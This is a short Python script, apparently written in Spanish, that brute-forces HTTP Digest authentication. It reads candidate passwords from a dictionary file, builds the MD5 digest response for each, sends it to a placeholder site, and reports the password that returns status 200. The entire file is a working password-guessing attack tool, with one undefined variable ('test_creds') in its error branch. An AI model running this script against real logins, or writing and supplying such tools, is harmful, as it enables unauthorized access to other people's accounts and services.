import requests, hashlib



user = 'VALID USER'
url = 'http://PATH_TO_SITE' 

peticion = requests.get(url=url) 

palabras = open(file='PATH_TO_DICTIONARY')
for palabra in palabras:

#Look and change every parameter below, from uri to cnonce, exactly as they are in your request.

    realm = peticion.headers.get('WWW-Authenticate').split('"')[1]
    nonce = peticion.headers.get('WWW-Authenticate').split('"')[3] 
    uri = ''
    method = 'GET'
    qop = ''
    algorithm = 'MD5' 
    nc = ''
    cnonce = ''


    hash1 = hashlib.md5((user + ":" + realm  + ":" + palabra.strip()).encode('utf-8')).hexdigest()
    hash2 = hashlib.md5((method + ':' + uri).encode('utf-8')).hexdigest()
    response = hashlib.md5((hash1 + ":"  + nonce +  ":" + nc + ":"  + cnonce  + ":" + qop + ":" +hash2).encode('utf-8')).hexdigest()


    header_string = 'Digest username="%s", realm="%s", nonce="%s", uri="%s", algorithm=%s, response="%s", qop=%s, nc=%s, cnonce="%s"' %(user, 
    realm, nonce, uri, algorithm, response, qop, nc, cnonce)
   

    headers = {'Authorization' : header_string}
    peticion = requests.get(url=url, headers=headers)

    if peticion.status_code == 200:
        print(f'Access with user \033[1;32m{user}\033[0;37m and password \033[1;32m{palabra}')
        break
        
    elif peticion.status_code == 401:
        print(f'Error with user \033[1;32m{user}\033[0;37m and password \033[1;31m{palabra}\033[0;37m')
    else:
        print('Status code ' + str(test_creds.status_code) + ' unexpected')
       
